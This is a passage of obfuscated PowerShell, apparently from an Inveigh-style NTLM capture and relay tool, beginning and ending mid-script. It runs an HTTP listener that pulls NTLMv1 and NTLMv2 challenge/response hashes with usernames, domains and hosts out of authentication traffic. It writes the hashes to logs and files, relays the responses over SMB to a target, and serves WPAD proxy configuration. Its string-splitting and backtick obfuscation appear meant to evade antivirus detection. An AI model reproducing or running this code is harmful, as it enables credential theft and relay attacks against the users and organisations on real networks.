                    ${Ht`Tp`_ntLm_le`NgtH} = &("{0}{2}{1}{3}" -f 'D','aLengt','at','h2') 20 ${Ht`Tp_RE`QUESt_`B`YTes}
                    ${hT`T`P_`N`TLM_OFfSEt} = &("{0}{2}{1}{3}"-f 'Dat','gt','aLen','h4') 24 ${hTtp_r`e`q`Uest_B`YTES}
                    ${HtTP_`NTL`m_`D`OMAin_`leng`Th} = &("{2}{0}{3}{1}"-f'L','2','Data','ength') 28 ${h`TTp_rEqUE`St_bY`T`Es}
                    ${H`Ttp_NTLm_DO`M`A`In_Off`set} = &("{2}{1}{0}" -f 'th4','ataLeng','D') 32 ${h`Ttp_RE`QuEst`_bYTes}
                    [String]${NTl`m_`cha`LLE`NgE} = ${I`Nv`eIgH}."hTtp_C`hAl`lEn`gE_QUEue" -like ${h`TTP`_`sOUR`cE_IP} + ${H`Tt`p_ClIE`Nt}."CL`I`Ent"."re`M`OteeND`POI`NT"."Po`RT" + '*'
                    ${i`N`VEIGh}."HT`T`p_c`hal`leNGE_Q`UEuE".("{1}{0}"-f'ove','Rem').Invoke(${NTL`m`_chALLen`Ge})
                    ${nt`L`m_Ch`AllENge} = ${n`T`Lm_C`hAL`leNGE}.("{0}{2}{1}" -f'S','tring','ubs').Invoke((${nT`Lm_cHaL`LeN`GE}.("{0}{1}"-f 'Inde','xOf').Invoke(",")) + 1)
                       
                    if(${h`TtP`_NtLm_DoMAIN_L`EN`G`Th} -eq 0)
                    {
                        ${h`TTp`_NtLM_dO`MA`iN`_S`TriNg} = ''
                    }
                    else
                    {  
                        ${HTt`p_nTlM`_D`OMaiN`_StRI`NG} = &("{3}{1}{0}{2}"-f'oStrin','taT','g','Da') ${ht`Tp_nTLm_`do`MaiN`_oFFS`Et} ${HTtp_`NtL`M_D`OMaIN_`l`EnGth} ${h`TTP`_`R`EqUEST_`BytEs}
                    } 
                    
                    ${hTt`p_NTL`M_`U`sER_lEnGtH} = &("{1}{0}{2}{3}" -f 'ataL','D','eng','th2') 36 ${h`T`Tp`_R`EQ`UeS`T_bYtES}
                    ${HtTp`_n`T`lM_USer_OFf`sEt} = &("{2}{0}{1}{3}"-f'ataLeng','t','D','h4') 40 ${HTtP`_rE`q`UeST`_`ByT`es}
                    
                    if(${H`TTP_NTl`M`_USE`R_`l`eNgth} -gt 0)
                    {    
                        ${hT`TP_NtL`m_`USer_S`TRINg} = &("{3}{0}{2}{1}"-f'aT','ing','oStr','Dat') ${http_N`T`l`M_uS`er_OffseT} ${H`T`Tp_NtL`M_`USE`R_l`eNGtH} ${Ht`T`P_r`eQUE`st_BYtEs}
                    }
                    else
                    {
                        ${H`T`TP`_n`TLM_UsEr_sT`Ri`Ng} = ""
                    }

                    ${Http_ntl`M_hO`s`T_LEng`Th} = &("{1}{2}{0}"-f'gth2','DataL','en') 44 ${HtT`p_r`eQUE`St`_ByTEs}
                    ${H`TTp_`NTLM_hoSt_`OFF`SEt} = &("{3}{0}{1}{2}" -f 'en','gth','4','DataL') 48 ${hT`Tp`_`ReQueSt_BYT`eS}
                    ${H`TT`P`_nt`Lm`_hoS`T_StRInG} = &("{3}{1}{2}{0}"-f 'ng','taTo','Stri','Da') ${HTt`p_N`TLM_`h`oST_O`F`FSET} ${http`_N`TlM`_hOSt_l`EnGth} ${http_`REqU`eS`T_bYtES}

                    if(${httP`_n`TL`m_LengTh} -eq 24) 
                    {
                        ${nTl`m`_`TYpe} = ("{1}{0}"-f'1','NTLMv')
                        ${nTLM`_`REs`pONsE} =   (  &("{0}{2}{1}" -f 'VARI','LE','AB') ('W'+'2ehX')  )."V`ALue"::"t`oStR`iNg"(${hTTp`_Req`U`EST_`BY`TES}[(${h`Ttp`_NtlM_`OFfSEt} - 24)..(${htTp`_nTL`m_oFfs`eT} + ${Http_`N`TLm_`L`EngTH})]) -replace "-",""
                        ${nTLM_`REsp`O`N`se} = ${nTLm_R`e`Sp`OnSe}.("{0}{1}{2}"-f 'Ins','e','rt').Invoke(48,':')
                        ${H`TtP_NT`lM_h`AsH} = ${HttP`_ntLM`_UsER_STrI`NG} + "::" + ${htT`p_NTLM_DOm`Ain`_`stRiNG} + ":" + ${N`Tl`m_Respon`sE} + ":" + ${nT`Lm_cH`AllE`NGe}

                        if(${NTLm`_c`HaL`LenGe} -and ${NtLM_Re`SP`ONsE} -and (${inV`eIgh}."Mac`hINe`_A`CC`OunTs" -or (!${IN`VeI`GH}."MaCHI`N`E_`ACCoUNtS" -and -not ${HTt`P_NtLm`_US`E`R`_`STrINg}.("{1}{2}{0}" -f'sWith','E','nd').Invoke('$'))))
                        {     
                            ${i`NvE`Igh}."NTl`Mv1_`LIsT".("{1}{0}" -f 'd','Ad').Invoke(${h`T`TP`_nTlm_ha`Sh})

                            if(${INV`EIgH}."fIlE`_ou`TPUt")
                            {
                                ${in`VeI`gh}."lO`G_F`ile_Qu`eue".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type $NTLM_type challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string) "))
                            }

                            if(${inv`eIgH}."lO`G_`OUtPUt")
                            {
                                ${iNV`Ei`GH}."L`oG".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type $NTLM_type challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string) "))
                            }
                        
                            if(!${i`NVeI`gH}."con`s`oL`e_un`iQuE" -or (${inVEI`gH}."COnSOle_uN`I`que" -and ${iNv`E`iGH}."ntl`mV1`_use`RN`AMe_lIST" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                ${iNVeI`GH}."C`ons`oLe`_qUEuE".("{0}{1}" -f'A','dd').Invoke($(&("{0}{1}"-f 'Get','-Date') -format 's') + (' '+'- '+"$HTTP_type "+"$NTLM_type "+'challenge/r'+'esp'+'on'+'s'+'e '+'ca'+'p'+'tured '+'fr'+'om '+"$HTTP_source_IP "+"($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash"))
                            }
                            else
                            {
                                ${i`N`VeigH}."COnsO`lE`_que`Ue".("{1}{0}" -f 'd','Ad').Invoke($(&("{1}{0}"-f'te','Get-Da') -format 's') + (' '+'- '+"$HTTP_type "+"$NTLM_type "+'chal'+'leng'+'e/resp'+'onse '+'c'+'aptur'+'ed '+'fr'+'om '+"$HTTP_source_IP "+"($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'- '+'n'+'ot '+'u'+'niqu'+'e'))
                            }

                            if(${INv`eigH}."FIlE`_oU`Tp`Ut" -and (!${i`NvEi`Gh}."FI`Le_un`ique" -or (${I`NVei`gH}."fIle_U`NiQ`Ue" -and ${i`N`VEIgH}."N`T`LmV1_USeRnAME_`lIst" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                            {
                                ${i`N`VEIgh}."n`Tlm`V1_fIL`E_QUEUE".("{1}{0}"-f 'd','Ad').Invoke(${hTtp_Nt`lm`_`HAsh})
                                ${InV`E`iGH}."con`sO`l`e_quEUe".("{1}{0}"-f 'd','Ad').Invoke(("$HTTP_type "+"$NTLM_type "+'c'+'hal'+'le'+'nge/respo'+'nse '+'w'+'ri'+'tten '+'t'+'o '+'') + ${InvEI`gh}."nTLMv1_oU`T_`F`iLe")
                            }

                            if(${IN`V`EigH}."ntlm`V1_uSeR`NAmE_`LIst" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                ${invei`GH}."nt`lM`V1_`USErnaME_LI`ST".("{0}{1}"-f'A','dd').Invoke(("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            }

                        }

                    }
                    else 
                    {   
                        ${NTl`m_ty`pe} = ("{0}{2}{1}"-f'N','LMv2','T')           
                        ${n`T`lm`_REsPOnse} =   ( &("{1}{2}{0}" -f'able','g','et-VaRI') ('w2eH'+'x')  -vALUEOn  )::"TOsT`R`iNG"(${hTtp`_rEQu`eST`_BytEs}[${h`Tt`p_n`T`lm_offsEt}..(${HTtP_n`T`lM_OfFS`Et} + ${H`T`TP`_`NTLM_L`ENgth})]) -replace "-",""
                        ${N`T`Lm`_RESpon`sE} = ${NtlM_RESp`o`NSE}.("{2}{1}{0}"-f'rt','e','Ins').Invoke(32,':')
                        ${htTp_`N`Tlm`_`haSH} = ${hTT`p`_NT`Lm`_U`S`ER_sTrINg} + "::" + ${hTtP`_ntl`m`_domaIN`_S`TrING} + ":" + ${N`TLm_`cHaLleNgE} + ":" + ${N`TLM`_R`es`poNse}
                        
                        if(${NT`l`M_cHaLl`E`Nge} -and ${NtL`M_R`esPOn`SE} -and (${i`NV`EIgH}."MAchIn`e`_aCCOuNTS" -or (!${i`NveIGh}."MA`c`HI`NE_aCCouNTS" -and -not ${httP`_NT`lM_u`ser_sTRi`NG}.("{1}{0}" -f'h','EndsWit').Invoke('$'))))
                        {
                            ${in`Vei`GH}."ntl`MV2_LI`sT".("{0}{1}" -f'Ad','d').Invoke(${H`TtP_n`T`LM_`haSh})

                            if(${IN`Vei`GH}."fI`l`e_oUt`pUt")
                            {
                                ${iNVe`i`gH}."LOg_F`I`lE_`queUE".("{0}{1}"-f 'A','dd').Invoke($(&("{2}{1}{0}" -f'te','et-Da','G') -format 's') + (' '+'- '+"$HTTP_type "+'NTL'+'Mv2 '+'c'+'h'+'alleng'+'e/res'+'ponse '+'f'+'or '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'captu'+'r'+'ed '+'from'+' '+"$HTTP_source_IP($HTTP_NTLM_host_string)"))
                            }

                            if(${i`N`VEigh}."Lo`G_OU`TPut")
                            {
                                ${in`VEI`gh}."L`Og".("{0}{1}" -f 'Ad','d').Invoke($(&("{2}{0}{1}"-f 'et-D','ate','G') -format 's') + (' '+'- '+"$HTTP_type "+'NT'+'LMv2'+' '+'cha'+'llenge/res'+'p'+'onse '+'fo'+'r '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'captur'+'e'+'d '+'from'+' '+"$HTTP_source_IP($HTTP_NTLM_host_string)"))
                            }
                        
                            if(!${InV`EI`gh}."CO`NSOLE`_`UniqUe" -or (${iNV`ei`GH}."COnS`OL`E`_UNIque" -and ${I`NvEI`GH}."N`TLm`V2_USe`Rna`Me_li`sT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                ${In`VE`IgH}."ConSo`le_`Qu`eUE".("{0}{1}" -f'Ad','d').Invoke($(&("{1}{0}{2}"-f'Da','Get-','te') -format 's') + (' '+'- '+"$HTTP_type "+'NT'+'LMv2 '+'c'+'hal'+'len'+'ge'+'/respon'+'se '+'c'+'ap'+'tured '+'fr'+'om '+"$HTTP_source_IP "+"($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash"))
                            }
                            else
                            {
                                ${i`NV`eiGh}."con`So`Le_Que`UE".("{1}{0}"-f 'dd','A').Invoke($(&("{1}{2}{0}"-f 'e','Ge','t-Dat') -format 's') + (' '+'- '+"$HTTP_type "+'NTLMv2'+' '+'c'+'ha'+'l'+'lenge/r'+'esp'+'on'+'se '+'c'+'apt'+'u'+'red '+'fro'+'m '+"$HTTP_source_IP "+"($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'- '+'not'+' '+'un'+'ique'))
                            }

                            if(${INVe`I`GH}."Fi`Le_`outPuT" -and (!${InV`EI`gH}."fiLe_`UNI`Q`Ue" -or (${I`NVEi`GH}."fIle`_un`iQ`Ue" -and ${IN`VEi`gH}."ntLMv2_u`sERn`AmE`_lIsT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                            {
                                ${in`V`eIGh}."NtLMV`2_fIl`e_`quE`UE".("{1}{0}"-f 'dd','A').Invoke(${hTt`p_`NTLm_ha`sH})
                                ${in`VeIGh}."CO`N`SOLE_QUE`UE".("{1}{0}" -f 'd','Ad').Invoke(("$HTTP_type "+'N'+'T'+'LMv2 '+'cha'+'lle'+'ng'+'e/re'+'spo'+'nse '+'writt'+'en'+' '+'to'+' '+'') + ${inV`eIGH}."NTlm`V2`_O`Ut_`FilE")
                            }

                            if(${i`NV`eIGh}."ntL`Mv2_UsER`N`Am`E_Li`ST" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                ${INv`EI`gH}."N`T`lmv`2`_Us`ERnaME_Li`ST".("{0}{1}"-f'A','dd').Invoke(("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            }
                        
                        }

                    }
                
                    ${HT`T`P_`Respo`Nse`_STaTus_`CODE} = 0x32,0x30,0x30
                    ${htT`p`_RESpoNSE`_`pH`RaSe} = 0x4f,0x4b
                    ${http_`c`LIe`Nt`_clo`sE} = ${t`RUe}
                    ${N`Tl`m_CH`All`eNGe} = ""
                    
                    if(${i`N`VEigH}."SMB_`REl`AY" -and ${r`ELa`y_S`TEp} -eq 2)
                    {

                        if(!${US`ErNA`MEs} -or ${USErn`A`meS} -contains ${htt`P_n`Tl`M_Use`R_sTrinG} -or ${U`se`RN`AmeS} -contains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                        {

                            if(${iN`V`eIgh}."m`ACHINE`_`A`CcoUNts" -or (!${iNV`e`Igh}."M`AcHinE`_AcC`o`UNTs" -and -not ${hTt`p_nt`LM_useR_ST`R`Ing}.("{2}{1}{0}" -f 'sWith','d','En').Invoke('$')))
                            {

                                if(${i`NVE`iGH}."sMbRELaY_`Fai`LEd`_li`sT" -notcontains ("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+"$Target"))
                                {

                                    if(${Inv`e`IGH}."fIlE_Ou`Tp`UT")
                                    {
                                        ${INv`eI`GH}."LOg`_fIle_q`Ueue".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target "))
                                    }

                                    if(${i`Nv`EiGh}."lOG_o`Ut`p`Ut")
                                    {
                                        ${INVE`iGH}."l`oG".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target "))
                                    }

                                    ${i`NVeigh}."co`NSO`LE_qUE`UE".("{1}{0}" -f'dd','A').Invoke(('Sendin'+'g'+' '+"$NTLM_type "+'resp'+'o'+'nse '+'fo'+'r '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'for'+' '+'re'+'la'+'y '+'to'+' '+"$Target"))
                                    &("{3}{0}{4}{1}{2}"-f 'Rel','Respons','e','SMB','ay') ${S`MB_rel`Ay_`sOCkEt} ${htTP_R`E`QU`eST_`BYTEs} ${SMb`_v`E`RSion} ${sM`B_Use`R_ID} ${SMB_`se`SSIo`N_id}
                                    ${R`ElAy_ST`eP} = 0

                                }
                                else
                                {

                                    if(${iNV`eIGH}."fILe_`o`Utp`UT")
                                    {
                                        ${i`Nv`eIgH}."lO`G`_fI`lE_`QuEue".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $Target "))
                                    }

                                    if(${i`N`Veigh}."lO`G_oUT`PUt")
                                    {
                                        ${I`Nvei`gh}."l`og".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $Target "))
                                    }

                                    ${invE`IgH}."CoN`solE`_Que`UE".("{0}{1}"-f'Ad','d').Invoke(('A'+'bor'+'ting '+'SMB'+' '+'rela'+'y'+' '+'s'+'ince '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'has'+' '+'alrea'+'dy'+' '+'bee'+'n '+'tri'+'ed'+' '+'on'+' '+"$Target"))
                                    ${SmB_`ReL`A`Y`_soCKET}.("{1}{0}"-f'lose','C').Invoke()
                                    ${r`e`laY`_stEP} = 0
                                }

                            }
                            else
                            {
                                
                                if(${IN`Ve`IGh}."fiL`E`_ouTPut")
                                {
                                    ${i`N`VeIgH}."LOg_f`I`lE_Qu`euE".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account "))
                                }

                                if(${iN`VEi`gH}."LOg_o`UT`Put")
                                {
                                    ${inv`Ei`gH}."L`oG".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account "))
                                }

                                ${In`VE`IGH}."con`sOlE`_QuEue".("{1}{0}"-f 'd','Ad').Invoke(('A'+'bortin'+'g '+'SM'+'B '+'r'+'elay'+' '+'si'+'nce '+"$HTTP_NTLM_user_string "+'appe'+'ars '+'to'+' '+'be'+' '+'a '+'m'+'ac'+'hine '+'acco'+'u'+'nt'))
                                ${S`Mb`_ReL`Ay`_SOC`kEt}.("{0}{1}" -f 'C','lose').Invoke()
                                ${Rel`AY_`sT`ep} = 0
                            }

                        }
                        else
                        {

                            if(${iNv`EI`gh}."fILE`_`Ou`TPuT")
                            {
                                ${i`N`VeigH}."L`og`_filE_qU`EUE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list "))
                            }

                            if(${iN`VE`Igh}."l`oG_ouT`pUT")
                            {
                                ${inVE`IGh}."L`oG".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list "))   
                            }

                            ${INv`e`iGH}."C`O`NSole`_qUEUE".("{0}{1}" -f 'A','dd').Invoke(("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'not'+' '+'on'+' '+'SMB'+' '+'re'+'lay'+' '+'userna'+'m'+'e '+'li'+'st'))
                            ${s`Mb`_r`eL`AY_`socket}.("{0}{1}" -f 'C','lose').Invoke()
                            ${ReL`AY_`s`Tep} = 0
                        }

                    }

                    if(${PRo`xy_`Liste`NEr})
                    {
                        ${HT`Tp`_`SeNd} = ${F`Al`Se}
                    }

                }
                else
                {
                    ${Http_ClIe`N`T`_cl`oSE} = ${f`AL`sE}
                }
        
            }

            if(!${pR`oX`y_Lis`TENEr} -and ${WP`AdREsp`ONSe} -and ${htt`P_REqU`e`s`T_raW`_Url} -match ("{1}{0}"-f 'at','/wpad.d') -and (!${P`RoxyI`GnORe} -or !(${pro`Xy`I`gnoRE} | &("{0}{2}{1}{3}"-f 'W','re-Obje','he','ct') {${hT`TP_HeAdEr`_uSer_a`G`ent} -match ${_}})))
            {
                ${hTT`p`_MEsSa`gE} = ${wp`AD`RESp`ON`se}
                ${htTP_HEad`Er`_`CoNtEnt_`Type} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  (&("{2}{0}{1}" -f 'aRiabl','e','v')  ('O'+'akF')  -ValUEon  )::"u`TF8".("{0}{1}" -f'GetB','ytes').Invoke(("{7}{2}{3}{5}{4}{6}{1}{0}" -f'onfig','autoc','plic','ation/','-ns-pro','x','xy-','ap'))
            }

            ${h`TTp`_tIMeSTA`mp} = &("{0}{2}{1}"-f 'Get','ate','-D') -format ('r')
            ${ht`TP_T`ime`sta`mP} =   ${OA`kf}::"u`Tf8".("{1}{2}{0}"-f'es','G','etByt').Invoke(${H`Ttp_TimeST`AMp})
            ${ht`TP`_`heADe`R_Co`Nt`En`T_len`gth} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +   ${O`AKF}::"ut`F8".("{0}{2}{1}" -f 'G','ytes','etB').Invoke(${HTTP_Me`SS`AGe}."len`GTH")
            ${HTt`p_mes`sage_b`YTeS} =  ${oa`kF}::"uT`F8".("{1}{2}{0}" -f's','G','etByte').Invoke(${HTT`P_mEs`SA`ge})

            if(${htTp_`R`eQUeSt_RaW_`URL} -notmatch ("{0}{1}{2}"-f'/wp','ad.','dat') -or (${W`Pad`AuTH} -like ("{0}{1}" -f'NT','LM*') -and ${HttP`_reQuE`s`T_r`AW_URl} -match ("{1}{0}"-f'dat','/wpad.')) -and !${h`TtP_`Clien`T_`c`LOsE})
            { 
                ${h`Ttp_HEA`D`eR_AUthe`Nt`Ic`A`TE`_DATA} =  (  &("{2}{0}{1}" -f'I','TeM','gEt-') VaRIAble:OAkf )."va`Lue"::"uT`F8".("{2}{1}{0}"-f'es','Byt','Get').Invoke(${n`TLm})
            }

            ${Pac`KE`T`_hTtpRe`sPOnse} = &("{1}{0}{2}{3}"-f 'e','N','w-','Object') ("{5}{2}{7}{4}{1}{3}{6}{0}" -f'onary','ion','m.Col','s.Specialized.Or','t','Syste','deredDicti','lec')
            ${pAc`Ket_`h`TtPreSP`OnSe}.("{0}{1}" -f'Ad','d').Invoke(("{4}{0}{6}{2}{3}{1}{5}" -f 'TTPResponse_','Vers','eq','uest','H','ion','R'),[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            ${PAC`kET_HtTp`RE`Sp`on`SE}.("{0}{1}"-f'Ad','d').Invoke(("{4}{3}{1}{0}{2}"-f'ta','_S','tusCode','esponse','HTTPR'),${hT`TP_R`ESpONse`_STAT`US_c`o`DE} + [Byte[]](0x20))
            ${pAckEt`_`h`Tt`pREsPOnSE}.("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{4}{0}{3}{6}{5}" -f 'onse','HTT','PRes','_Respo','p','ase','nsePhr'),${hTT`P_R`eSpon`se_p`hrasE} + [Byte[]](0x0d,0x0a))
            ${pACkE`T`_hTtpR`eSPonsE}.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{3}{0}{4}" -f'ponse_Serv','TTPR','H','es','er'),[Byte[]](0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a))
            ${P`ACke`T`_HT`TPreSPo`NsE}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{4}{2}{0}{6}{5}" -f'e_T','H','espons','T','TPR','p','imeStam'),[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + ${HtT`p_`TiM`est`AmP} + [Byte[]](0x0d,0x0a))
            ${pAc`k`Et`_`HTTPRES`PoNSE}.("{1}{0}"-f'dd','A').Invoke(("{7}{3}{1}{6}{0}{2}{4}{5}" -f'C','nse','ontentLeng','spo','t','h','_','HTTPRe'),${HttP`_H`e`ADe`R_ConTEN`T_LenG`TH} + [Byte[]](0x0d,0x0a))

            if(${hTtP_HEader_`A`UT`hENt`icAtE} -and ${H`T`Tp_heAdeR`_Au`THeNTic`AtE_dAtA})
            {
                ${P`ACK`Et_H`TtPReSPo`NsE}.("{1}{0}"-f'd','Ad').Invoke(("{1}{5}{2}{0}{3}{4}"-f 'henticate','HT','Aut','Heade','r','TPResponse_'),${H`TtP`_head`Er`_`AUT`heNtICA`TE} + ${H`T`TP_Hea`dER_auTHen`T`Ica`TE_D`A`TA} + [Byte[]](0x0d,0x0a))
            }

            if(${Htt`p_he`ADE`R_c`OnT`ent_TyPE})
            {
                ${pAc`k`et`_`hTTPReSp`OnSE}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{2}{3}{4}{1}{0}"-f'ntType','se_Conte','PRes','po','n','HTT'),${HtT`P_H`eADe`R_`CoNTe`NT`_tYPE} + [Byte[]](0x0d,0x0a))
            }

            if(${H`Ttp_HEadeR_CACHe_C`oN`T`Rol})
            {
                ${P`AC`ket_`Htt`PR`eSpOnSE}.("{0}{1}"-f'A','dd').Invoke(("{3}{1}{0}{2}{4}{6}{5}"-f'TPRes','T','ponse_CacheC','H','o','ol','ntr'),${HTtp_`HeadER`_cA`C`he_Co`NT`ROL} + [Byte[]](0x0d,0x0a))
            }

            if(${hT`Tp`_sEnD})
            {
                ${PackeT_H`T`TpR`Es`pOnSE}.("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}{3}" -f 'H','PRespons','TT','e_Message'),[Byte[]](0x0d,0x0a) + ${hTt`P_`M`EsSaG`e_bYt`Es})
                ${h`TtP_rEsp`onse} = &("{3}{6}{1}{2}{4}{5}{0}" -f 'tionary','ve','rtFrom-Pack','C','etO','rderedDic','on') ${PaC`KeT_`HTTPR`ESPonSe}
                ${Http_`st`Ream}.("{1}{0}" -f'rite','W').Invoke(${HT`T`p_rEsponSe},0,${HtTp_R`ESp`On`sE}."len`g`Th")
                ${hT`TP`_`StrEaM}.("{0}{1}" -f 'Fl','ush').Invoke()
            }

            &("{0}{3}{1}{2}" -f'Sta','t-Sl','eep','r') -m 10
            ${http_REqUEst_`RaW`_`U`R`L_o`ld} = ${hTTP_`Re`QUES`T`_rA`w_U`Rl}
            ${HTt`p_clIeNT_Ha`NDl`E_`oLd} = ${htTp_`CLIe`NT}."cl`ienT"."HA`NDLE"

            if(${httP_C`LIE`Nt`_Cl`OsE})
            {

                if(${Pr`OXy_LIst`E`NEr})
                {
                    ${HtTP_Cli`e`NT}."C`LI`ENt".("{0}{1}" -f'Clos','e').Invoke()
                }
                else
                {
                    ${HTt`P_`C`LIenT}.("{0}{1}"-f 'Clos','e').Invoke()
                }

            }

        }
        else
        {

            if(${hT`Tp_`Data_`A`V`AIlABle} -or !${ht`Tp`_R`eset_DeLaY} -or ${HtT`P_`REsET_d`e`lay_sTO`pw`A`TcH}."elAp`SEd" -ge ${HTTP_r`eSET_DEl`A`Y`_`T`I`MEOUT})
            {
                ${hTtp_c`l`i`enT}.("{0}{1}" -f'Clos','e').Invoke()
                ${htTP_`ClIent_`C`L`OsE} = ${T`RUe}
                ${HtTP_r`Es`E`T_dElay} = ${f`A`LSe}
            }
            else
            {
                &("{0}{2}{3}{1}"-f 'Sta','p','rt-','Slee') -m 100
            }

        }

    }

    ${hT`Tp`_clI`ENt}.("{1}{0}"-f 'se','Clo').Invoke()
    &("{1}{2}{0}"-f'art-sleep','s','t') -s 1
    ${hTTp_Li`s`Te`NER}."S`ERVer"."BlOck`I`NG" = ${F`Al`Se}
    &("{1}{0}{2}" -f't-','Star','Sleep') -s 1
    ${hTT`p_Li`StEnER}."S`e`Rver".("{1}{0}" -f'lose','C').Invoke()
    &("{1}{0}{3}{2}"-f 'rt','Sta','leep','-S') -s 1
    ${h`Tt`P_LiSTEn`ER}.("{0}{1}" -f'St','op').Invoke()
}


${c`OnT`ROL_`RElAy`_Sc`RIPtblock} = 
{
    param (${COnsO`l`EQ`UeUeLI`Mit},${REL`AY`AuT`OEXIT},${Run`TI`me})

    function STO`P`INV`eIGH
    {
        param ([String]${eXit_m`eS`s`A`GE})

        if(${Inve`iGh}."hT`TpS" -and !${iN`VE`iGh}."HTtps_eXI`sTiNG`_`cERTifiCA`TE" -or (${i`NvE`IGh}."h`TtPs`_ExISTI`N`g_Ce`RtiFicAte" -and ${Inv`E`IGH}."HTtPS`_`FoR`CE_cERt`iFic`Ate_DeLETe"))
        {

            try
            {
                ${CE`RTIf`iCaT`E`_Sto`Re} = &("{2}{0}{1}"-f '-Objec','t','New') ("{5}{6}{0}{9}{2}{1}{8}{3}{7}{4}"-f'curit','p','ogra','ficates.X509Sto','e','Sy','stem.Se','r','hy.X509Certi','y.Crypt')("My",("{0}{1}{2}" -f 'Lo','calM','achine'))
                ${C`eRtifIc`Ate`_`StoRE}.("{1}{0}"-f'en','Op').Invoke(("{2}{1}{0}"-f 'e','Writ','Read'))
                ${Ce`RTIf`iCA`Tes} = (&("{1}{0}{2}"-f 'hil','Get-C','dItem') ((("{3}{1}{5}{6}{0}{2}{4}" -f'achine','{0}L','{0}','Cert:','My','ocal','M')) -f [CHar]92) | &("{1}{0}{2}" -f 'e-O','Wher','bject') {${_}."IS`SuEr" -Like "CN=" + ${INvEI`gh}."C`ERTI`F`I`CAtE_IsSu`er"})

                ForEach(${Cert`I`F`ICate} in ${Cer`Ti`FiCAT`eS})
                {
                    ${ceRTIF`ICAt`E`_`stoRE}.("{1}{0}" -f 'move','Re').Invoke(${cErt`I`FIcate})
                }

                ${cE`RT`iF`icaTE_stoRe}.("{0}{1}" -f'Clo','se').Invoke()
            }
            catch
            {
                ${I`Nvei`Gh}."C`on`s`ol`E_QueuE".("{1}{0}"-f'dd','A').Invoke(("{4}{7}{0}{3}{1}{5}{8}{6}{2}"-f 'Certifica','le','lly','te De','S','tion Error - ','a','SL ','Remove Manu'))

                if(${InVe`i`GH}."Fil`E_OU`TP`Ut")
                {
                    ${INV`E`iGh}."L`oG_fIl`e`_Qu`Eue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))
                }

                if(${I`NVe`IGh}."log_O`U`TpUT")
                {
                    ${i`N`VeIgH}."L`og".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))
                }

            }

        }
        
        if(${inV`e`igh}."r`UNN`ING")
        {
            &("{2}{0}{1}{3}" -f'tart-S','lee','S','p') -S 1
